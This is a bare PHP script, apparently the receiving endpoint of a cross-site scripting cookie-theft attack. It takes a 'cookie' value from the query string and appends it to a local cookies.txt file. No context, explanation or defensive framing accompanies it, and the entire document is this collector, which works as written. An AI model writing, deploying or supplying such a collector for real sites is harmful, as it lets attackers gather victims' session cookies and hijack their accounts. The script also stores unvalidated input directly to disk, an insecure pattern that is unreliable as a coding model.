<?php
if($_GET['cookie']) {
 $handle = fopen("cookies.txt","a"); 
 fwrite($handle, $_GET['cookie']);
 fclose($handle);
}
?>